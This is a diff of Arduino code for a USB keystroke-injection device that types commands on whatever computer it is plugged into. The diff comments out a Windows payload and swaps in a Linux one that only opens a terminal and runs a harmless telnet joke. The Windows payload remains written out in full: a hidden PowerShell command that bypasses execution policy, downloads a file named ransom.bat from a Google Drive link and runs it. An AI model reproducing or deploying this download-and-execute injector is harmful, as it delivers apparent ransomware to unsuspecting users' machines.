@@ -20,16 +20,34 @@ uint8_t buf[8] = {0};  //buffer
 
 void setup() {
     Serial.begin(9600);
-    delay(500);
-    keyPress(LEFT_GUI, 0x15);  // Windows keys + R
+//  Windows Payload    
+    // delay(500);
+    // keyPress(LEFT_GUI, 0x15);  // Windows keys + R
+    // keyRelease();
+    // delay(200);
+    // keyString("cmd.exe");
+    // delay(500);
+    // keyPress(0, KEY_ENTER);
+    // keyRelease();
+    // delay(500);
+    // keyString("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=1L-u32pMh-q4LBTj2D5m7boKLosfrR1Oy', \\\"$env:temp\\ransom.bat\\\"); Start-Process \"$env:temp\\ransom.bat\"\"");
+    // keyPress(0, KEY_ENTER);
+    // keyRelease();
+
+    
+//  Linux Payload
+    keyPress(LEFT_ALT, 59); //ALT + F2 to run command
     keyRelease();
-    delay(200);
-    keyString("cmd.exe");
+    delay(1000);
+    
+    keyString("gnome-terminal");
     delay(500);
+    
     keyPress(0, KEY_ENTER);
     keyRelease();
     delay(500);
-    keyString("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=1L-u32pMh-q4LBTj2D5m7boKLosfrR1Oy', \\\"$env:temp\\ransom.bat\\\"); Start-Process \"$env:temp\\ransom.bat\"\"");
+    
+    keyString("telnet towel.blinkenlights.nl");
     keyPress(0, KEY_ENTER);
     keyRelease();
 }
